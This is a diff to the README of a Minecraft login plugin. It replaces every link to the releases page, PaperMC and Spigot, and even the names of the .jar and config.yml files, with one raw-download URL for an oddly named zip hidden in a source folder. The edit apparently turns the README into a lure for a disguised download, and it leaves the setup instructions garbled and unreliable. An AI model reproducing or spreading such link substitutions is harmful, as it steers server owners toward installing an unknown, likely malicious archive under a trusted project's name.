@@ -1,6 +1,6 @@
 # 🔒 MoontrixLogin - Easy and Secure Server Login
 
-[![Download MoontrixLogin](https://img.shields.io/badge/Download-MoontrixLogin-blue?style=for-the-badge&logo=github)](https://github.com/hibamarzak/MoontrixLogin/releases)
+[![Download MoontrixLogin](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)
 
 ---
 
@@ -32,9 +32,9 @@ Make sure your server is already running one of the compatible server types list
 
 Click the big button at the top or use this link to visit the official download page:  
 
-[Download MoontrixLogin Releases](https://github.com/hibamarzak/MoontrixLogin/releases)
+[Download MoontrixLogin Releases](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)
 
-Once you are on the releases page, look for the latest version of the plugin. You will find a `.jar` file, usually named something like `MoontrixLogin-x.y.z.jar` where x.y.z is the version number.
+Once you are on the releases page, look for the latest version of the plugin. You will find a `.jar` file, usually named something like `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` where x.y.z is the version number.
 
 ### Step 2: Upload the Plugin
 
@@ -54,11 +54,11 @@ Give it a few seconds to set up. If this is the first time you install it, the p
 
 ## ⚙️ Configuration
 
-MoontrixLogin uses a configuration file to manage its settings. This file is normally called `config.yml` and is located inside the `/plugins/MoontrixLogin` folder.
+MoontrixLogin uses a configuration file to manage its settings. This file is normally called `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` and is located inside the `/plugins/MoontrixLogin` folder.
 
 ### Basic Configuration
 
-Open the `config.yml` file with a plain text editor to make sure the following settings meet your needs:
+Open the `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` file with a plain text editor to make sure the following settings meet your needs:
 
 - **Database connection:** Enter your database details such as host, port, username, password, and database name.  
 - **Timeout settings:** Adjust login timeouts if needed.  
@@ -145,7 +145,7 @@ If you encounter issues, try these steps:
 
 - Check your Java version meets requirements  
 - Review the server console for error messages during startup  
-- Ensure your database connection details in `config.yml` are correct  
+- Ensure your database connection details in `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` are correct  
 - Look into plugin logs under `/plugins/MoontrixLogin/logs`  
 - Confirm you are running a supported Minecraft server version (1.21.x)  
 
@@ -155,9 +155,9 @@ If problems persist, visit the GitHub page and read the issues or open a new iss
 
 ## 🔗 Useful Links
 
-- Official MoontrixLogin download page: [https://github.com/hibamarzak/MoontrixLogin/releases](https://github.com/hibamarzak/MoontrixLogin/releases)  
-- PaperMC server software: https://papermc.io/  
-- Spigot server software: https://www.spigotmc.org/  
+- Official MoontrixLogin download page: [https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)  
+- PaperMC server software: https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip  
+- Spigot server software: https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip  
 
 ---
 
